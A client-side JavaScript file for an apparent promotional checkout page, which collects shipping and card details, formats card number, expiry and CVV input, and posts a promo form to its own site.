let shippingInfo = {
    fullName: '',
    email: '',
    phone: '',
    address: '',
    city: '',
    zip: '',
    country: 'Australia',
    shippingMethod: 'standard',
    nameOnCard: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
};

function handleInputChange(event, key) {
    let value = event.target.value;

    if (key === 'nameOnCard') {
        value = value.toUpperCase();
        event.target.value = value;
    }

    shippingInfo[key] = value;
}

function validateCardNumber(input) {
    let cardNumber = input.value.replace(/\D/g, '').substring(0, 16);
    cardNumber = cardNumber != '' ? cardNumber.match(/.{1,4}/g).join(' ') : '';
    input.value = cardNumber;
    shippingInfo.cardNumber = cardNumber;
}

function validateExpiry(input) {
    let expiryDate = input.value.replace(/\D/g, '').substring(0, 4);
    expiryDate = expiryDate != '' ? expiryDate.match(/.{1,2}/g).join('/') : '';
    input.value = expiryDate;
    shippingInfo.expiry = expiryDate;
}

function validateCVV(input) {
    let cvv = input.value.replace(/\D/g, '').substring(0, 4);
    input.value = cvv;
    shippingInfo.cvv = cvv;
}

document.addEventListener("DOMContentLoaded", function() {
    const promoForm = document.getElementById('promo-form');
    promoForm.addEventListener('submit', function(event) {
        event.preventDefault();
        let formData = new FormData(promoForm);

        fetch('/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(formData).toString()
        })
        .then(response => {
            if (!response.ok) {
                                throw new Error('Network response was not ok');
            }
            // Implement successful submission logic, e.g., redirect or show a message
        })
        .catch(error => {
            console.error('Form submission error:', error);
            alert('Form submission failed, please try again.');
        });
    });

    const inputFields = ['fullName', 'email', 'phone', 'address', 'city', 'zip', 'country', 'nameOnCard', 'cardNumber', 'expiry', 'cvv'];
    inputFields.forEach((inputField, index) => {
        const element = document.getElementById(inputField);
        element.addEventListener('input', function(event) {
            if (element.id === 'cardNumber') {
                validateCardNumber(element);
            } else if (element.id === 'expiry') {
                validateExpiry(element);
            } else if (element.id === 'cvv') {
                validateCVV(element);
            }
            handleInputChange(event, element.id);
            if (element.value.length === (element.maxLength || element.size)) {
                const nextInput = inputFields[index + 1];
                if (nextInput) {
                    document.getElementById(nextInput).focus();
                }
            }
        });
    });

    document.getElementById('standardShipping').addEventListener('change', handleRadioChange);
    document.getElementById('priorityShipping').addEventListener('change', handleRadioChange);

    function handleRadioChange(event) {
        shippingInfo.shippingMethod = event.target.value;
    }

    // Set default value for country field
    const countryInput = document.getElementById('country');
    if (countryInput) {
        countryInput.value = 'Australia';
    }

    // Function to handle the claim offer button click
    function handleClaimOffer() {
        var claimButton = document.querySelector('.claim-offer-btn');
        var promoCard = document.querySelector('.promo-card'); // Select the promo card

        if (claimButton) {
            claimButton.addEventListener('click', function(event) {
                event.preventDefault(); // Prevent the default form action
                claimButton.textContent = 'Claimed!'; // Change button text
                claimButton.disabled = true; // Disable the button
                claimButton.classList.add('claimed'); // Add class to change button style
                promoCard.classList.add('promo-claimed'); // Add class to change promo card border
            });
        }
    }

    // Call the function to handle the claim offer button
    handleClaimOffer();
});
